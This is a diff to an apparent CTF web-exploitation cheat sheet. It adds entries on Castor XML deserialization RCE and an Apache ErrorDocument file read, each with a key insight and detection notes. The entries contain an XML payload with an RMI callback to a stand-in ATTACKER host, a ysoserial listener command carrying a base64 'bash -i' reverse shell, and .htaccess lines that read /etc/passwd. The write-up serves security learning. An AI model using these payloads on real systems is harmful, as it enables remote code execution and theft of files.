@@ -18,6 +18,8 @@
 - [basename() Bypass for Hidden Files (Nullcon 2026)](#basename-bypass-for-hidden-files-nullcon-2026)
 - [React Server Components Flight Protocol RCE (Ehax 2026)](#react-server-components-flight-protocol-rce-ehax-2026)
 - [SSRF → Docker API RCE Chain (H7CTF 2025)](#ssrf--docker-api-rce-chain-h7ctf-2025)
+- [Castor XML Deserialization via xsi:type Polymorphism (Atlas HTB)](#castor-xml-deserialization-via-xsitype-polymorphism-atlas-htb)
+- [Apache ErrorDocument Expression File Read (Zero HTB)](#apache-errordocument-expression-file-read-zero-htb)
 
 ---
 
@@ -520,3 +522,60 @@ curl "http://target/validate?url=http://localhost:8090/request?method=post\
 | `/containers/create` | POST | Create new container |
 
 **Key insight:** Unauthenticated Docker daemons on port 2375 give full container control. When SSRF is GET-only, look for internal proxy or request-relay endpoints that forward POST requests. Use `sh` instead of `bash` in minimal containers (busybox, alpine).
+
+---
+
+## Castor XML Deserialization via xsi:type Polymorphism (Atlas HTB)
+
+**Pattern:** Castor XML `Unmarshaller` without mapping file trusts `xsi:type` attributes, allowing arbitrary Java class instantiation.
+
+**Attack chain:** `xsi:type` → `PropertyPathFactoryBean` + `SimpleJndiBeanFactory` → JNDI/RMI → ysoserial JRMP listener → `CommonsBeanutils1` gadget → RCE
+
+**Requires:** Java 11 (not 17+) — ysoserial gadgets fail on Java 17+ due to module access restrictions.
+
+**XML payload example with Spring beans for RMI callback:**
+```xml
+<data xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+      xmlns:java="http://java.sun.com">
+  <item xsi:type="java:org.springframework.beans.factory.config.PropertyPathFactoryBean">
+    <targetBeanName>
+      <item xsi:type="java:org.springframework.jndi.support.SimpleJndiBeanFactory">
+        <shareableResources>rmi://ATTACKER:1099/exploit</shareableResources>
+      </item>
+    </targetBeanName>
+    <propertyPath>foo</propertyPath>
+  </item>
+</data>
+```
+
+```bash
+# Start ysoserial JRMP listener
+java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsBeanutils1 'bash -c {echo,BASE64_PAYLOAD}|{base64,-d}|{bash,-i}'
+```
+
+**Key insight:** Castor XML without explicit mapping files is effectively an XML-based deserialization sink. The `xsi:type` attribute acts like Java's `ObjectInputStream` — any class on the classpath can be instantiated. Check `pom.xml` for `castor-xml`, `commons-beanutils`, and `commons-collections` dependencies. JNDI (Java Naming and Directory Interface) via RMI (Remote Method Invocation) provides the callback mechanism.
+
+**Detection:** Java app using Castor XML for deserialization, `castor-xml` in `pom.xml`, `commons-beanutils`/`commons-collections` dependencies.
+
+---
+
+## Apache ErrorDocument Expression File Read (Zero HTB)
+
+**Pattern:** Apache's `ErrorDocument` directive with expression syntax reads files at the Apache level, bypassing PHP engine disable.
+
+**Requires:** `AllowOverride FileInfo` in userdir config.
+
+**Attack chain:**
+1. Upload `.htaccess` to subdirectory via SFTP (Secure File Transfer Protocol):
+```apache
+ErrorDocument 404 "%{file:/etc/passwd}"
+```
+2. Request a nonexistent URL in that directory to trigger the 404 handler
+3. Read PHP source via `cat -v` to see raw content:
+```apache
+ErrorDocument 404 "%{file:/var/www/html/stats.php}"
+```
+
+**Key insight:** Works even when `php_admin_flag engine off` disables PHP execution in user directories. The `%{file:...}` expression is evaluated by Apache itself, not PHP — so PHP disable flags are irrelevant.
+
+**Detection:** Apache with `mod_userdir`, `AllowOverride FileInfo`, writable `.htaccess` in subdirectories.
